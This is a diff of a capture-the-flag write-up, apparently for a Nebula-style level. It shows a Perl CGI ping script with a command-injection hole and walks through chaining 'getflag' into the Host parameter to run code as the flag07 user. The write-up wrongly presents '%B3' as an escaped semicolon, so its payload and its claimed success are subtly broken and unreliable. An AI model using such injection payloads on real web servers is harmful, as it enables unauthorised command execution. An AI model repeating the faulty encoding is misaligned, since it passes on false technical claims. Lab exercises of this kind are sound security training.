@@ -1,5 +1,8 @@
 The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.
 
+In /home/flag07 directory we can see two interesting files:
+
+index.cgi
 #!/usr/bin/perl
 
 use CGI qw{param};
@@ -14,17 +17,30 @@ sub ping {
   @output = `ping -c 3 $host 2>&1`;
   foreach $line (@output) { print "$line"; }
 
-  print("</pre></body></html>");
-  
+  print("</pre></body></html>");  
 }
 
 # check if Host set. if not, display normal page, etc
-
 ping(param("Host"));
 
+and thttpd.conf.
 
+We can assume that thttpd.conf is a configuration for a web server deamon. If we scroll through this file we can find two interesting informations:
+- user running the deamon is flag07
+- port on which server is listening is 7007.
 
+As always, we're trying to execute getflag as a flag user. Host parameter in perl script is not sanitized, so we should be able to inject our code in there. 
+We can check ip address using ifconfig in terminal. Then we can visit webpage from local machine by going to http://vmipaddr:7007/index.cgi
 
-In thttpd.conf port 7007, go to ipaddr:7007 in browser
-Inject command in Host parameter
-index.cgi?Host=localhost%B3getflag <- escape semicolon 
+Now we will see information about usage of ping command. This is caused by lack of Host parameter. Let's add one via GET method.
+
+index.cgi?Host=localhost
+
+Now we see resultf of a ping command. Let's try chaining additional command.
+index.cgi?Host=localhost ; getflag
+
+Unfortunately, it's not working. The reason is we have unescaped characters in our address. We can get read of spaces and only escape semicolon.
+index.cgi?Host=localhost%B3getflag
+
+Now under results of ping we can see a string:
+You have successfully executed getflag on a target account.
